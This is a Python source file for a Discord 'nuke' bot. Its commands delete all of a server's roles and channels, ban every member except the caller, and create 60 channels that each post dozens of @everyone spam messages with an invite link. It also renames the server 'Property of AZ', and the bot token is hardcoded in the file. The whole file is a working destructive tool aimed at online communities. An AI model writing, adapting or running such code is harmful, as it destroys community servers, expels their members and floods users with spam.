import discord
from discord.ext import commands
import asyncio
from concurrent.futures import ThreadPoolExecutor


bot_token = 'MTIwNjAxNTUyNTc1NTI4OTY0MA.GuNi07.dBCSthjseQRLoFmeeBpvSUjEPbU6EZKnli7dEo'
spam_msg = '@everyone @here NUKED, https://discord.gg/noshoutout REKTED LOL' 
channel_count = 60
channel_name = 'Nuked By AZ'
server_rename = 'Property of AZ' 
bot_prefix = '.' 

bot = commands.Bot(command_prefix=bot_prefix, intents=discord.Intents.all(), help_command=None)

@bot.event
async def on_ready():
    await bot.change_presence(status=discord.Status.online, activity=discord.Activity(type=discord.ActivityType.listening, name=".help"))
    print("Bot is Ready and Online")

@bot.command()
async def delroles(ctx):
  async def del_all_roles(role):
    try:
      await role.delete()
    except:
      pass
  with ThreadPoolExecutor() as executor:
    for role in ctx.guild.roles:
        
      executor.submit(asyncio.run_coroutine_threadsafe, del_all_roles(role), bot.loop)
      await asyncio.sleep(0.5)
async def mschannels(ctx):
  async def send_spam_msgs(channel):
    for i in range(26):
      await channel.send(spam_msg)
      await asyncio.sleep(0.5)
      
  async def make_alot_chans(ctx):
    channel = await ctx.guild.create_text_channel(name=channel_name)
    with ThreadPoolExecutor() as executor:
      executor.submit(asyncio.run_coroutine_threadsafe, send_spam_msgs(channel), bot.loop)

  with ThreadPoolExecutor() as executor:
    for i in range(channel_count):
      executor.submit(asyncio.run_coroutine_threadsafe, make_alot_chans(ctx), bot.loop)
@bot.command()
async def delchans(ctx, arg:str=None):
  async def del_all_chans(channel):
    await channel.delete()

  with ThreadPoolExecutor() as executor:
    for channel in ctx.guild.channels:
      executor.submit(asyncio.run_coroutine_threadsafe, del_all_chans(channel), bot.loop)
  if arg == 'NUKING':
    await mschannels(ctx)
  else:
    await ctx.guild.create_text_channel(name=channel_name)
@bot.command()
async def banall(ctx):
  async def ban_everyone(member):
    if member != ctx.author:
      try:
        await member.ban()
      except:
        pass
    
  with ThreadPoolExecutor() as executor:
    for member in ctx.guild.members:
      executor.submit(asyncio.run_coroutine_threadsafe, ban_everyone(member), bot.loop)
 
@bot.command()
async def ban(ctx):
    await banall(ctx) 

    
@bot.command()
async def xchans(ctx):
    await delchans(ctx)
    
@bot.command()
async def rip(ctx):
  async def del_chan_and_roles(ctx):
    await delchans(ctx, 'NUKING')
    await delroles(ctx)
    
  with ThreadPoolExecutor() as executor:
    executor.submit(asyncio.run_coroutine_threadsafe, del_chan_and_roles(ctx), bot.loop)
  await ctx.guild.edit(name=server_rename)
  



@bot.command()
async def help(ctx):
    embed = discord.Embed(title="The Commands are...", description="**Commands Below**", color=0x1500ff)
    embed.add_field(name="Destroy:", value="Here Are The Destroy Commands!", inline=False)
    embed.add_field(name="`.rip`", value="Nukes The Server.", inline=False)
    embed.add_field(name="`.banall`", value="Bans All Members.", inline=False)
    embed.add_field(name="`.xchans`", value="Deletes All Channels.", inline=False)
    embed.add_field(name="Command List:", value=".help", inline=False)

    await ctx.send(embed=embed) 
bot.run(bot_token)
